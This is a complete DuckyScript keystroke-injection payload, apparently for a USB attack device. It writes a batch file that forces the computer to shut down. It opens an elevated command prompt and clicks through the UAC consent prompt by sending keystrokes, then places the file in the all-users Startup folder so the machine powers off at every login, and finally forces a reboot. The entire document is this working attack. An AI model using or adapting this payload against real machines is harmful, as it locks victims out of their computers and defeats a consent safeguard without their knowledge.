    DELAY 5000
    GUI r
    DELAY 800
    STRING notepad
    DELAY 800
    ENTER
    DELAY 800
    STRING @echo off
    DELAY 800
    ENTER
    STRING shutdown /p
    DELAY 800
    CONTROL S
    DELAY 800
    ALT D
    DELAY 800
    STRING Documents
    DELAY 800
    ENTER
    DELAY 800
    ALT n
    DELAY 800
    STRING and i oop.bat
    DELAY 850
    ALT t
    DELAY 800
    DOWNARROW
    DELAY 800
    DOWNARROW
    DELAY 800
    ENTER
    DELAY 800
    ALT s
    DELAY 800
    ALT F4
    DELAY 800
    GUI r
    DELAY 800
    STRING cmd
    DELAY 800
    CONTROL SHIFT ENTER
    DELAY 800
    LEFTARROW
    DELAY 850
    ENTER
    DELAY 800
    STRING echo %username% |clip
    DELAY 800
    ENTER
    DELAY 800
    STRING cd..
    DELAY 800
    ENTER
    DELAY 800
    STRING cd..
    DELAY 800
    ENTER
    DELAY 800
    STRING cd Users\
    DELAY 800
    CONTROL v
    DELAY 900
    ENTER
    DELAY 800
    STRING move "Documents\and i oop.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
    DELAY 800
    ENTER
    DELAY 8000
    STRING shutdown /r /t 0        